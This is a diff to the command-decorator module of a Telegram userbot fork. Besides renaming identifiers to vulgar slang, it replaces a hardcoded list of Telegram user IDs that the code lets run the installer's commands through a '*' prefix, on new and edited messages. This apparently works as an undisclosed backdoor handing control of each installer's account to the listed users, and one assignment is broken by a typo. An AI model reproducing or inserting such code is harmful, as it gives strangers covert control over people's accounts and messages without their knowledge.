@@ -1,7 +1,7 @@
 # Credits: @mrconfused
 # Ported by @mrismanaziz
 # FROM Man-Userbot
-# ReC0de by @Pocongonlen
+# ReC0de by @grey423
 
 import inspect
 import re
@@ -21,13 +21,13 @@ from userbot import (
 )
 
 
-KUNTILANAK = [1593802955, 1675900974]
-TUYUL_HANDLER = "*"
+MEMEK = [1784606556]
+TITIT_HANDLER = "*"
 
-def poci_cmd(
+def cilik_cmd(
     pattern: str = None,
     allow_sudo: bool = True,
-    gendoruwo: bool = True,
+    sempakabri: bool = True,
     disable_edited: bool = False,
     forword=False,
     command: str = None,
@@ -50,20 +50,20 @@ def poci_cmd(
     if pattern is not None:
         global man_reg
         global sudo_reg
-        global tuyul_reg
+        global titit_reg
         if (
             pattern.startswith(r"\#")
             or not pattern.startswith(r"\#")
             and pattern.startswith(r"^")
         ):
-            man_reg = sudo_reg = tuyul_req = re.compile(pattern)
+            man_reg = sudo_reg = titit_req = re.compile(pattern)
         else:
             man_ = "\\" + CMD_HANDLER
             sudo_ = "\\" + SUDO_HANDLER
-            tuyul = "\\" + TUYUL_HANDLER
+            titit = "\\" + TITIT_HANDLER
             man_reg = re.compile(man_ + pattern)
             sudo_reg = re.compile(sudo_ + pattern)
-            tuyul_reg = re.compile(tuyul + pattern)
+            titit_reg = re.compile(titit + pattern)
             if command is not None:
                 cmd1 = man_ + command
                 cmd2 = sudo_ + command
@@ -90,18 +90,18 @@ def poci_cmd(
         bot.add_event_handler(
             func, events.NewMessage(**args, outgoing=True, pattern=man_reg)
         )
-        if gendoruwo:
+        if sempakabri:
             if not disable_edited:
                 bot.add_event_handler(
                     func,
                     events.MessageEdited(
-                        **args, from_users=KUNTILANAK, pattern=tuyul_reg
+                        **args, from_users=MEMEK, pattern=titit_reg
                     ),
                 )
             bot.add_event_handler(
                 func,
                 events.NewMessage(
-                    **args, from_users=KUNTILANAK, pattern=tuyul_reg
+                    **args, from_users=MEMEK, pattern=titit_reg
                 ),
             )
         if allow_sudo:
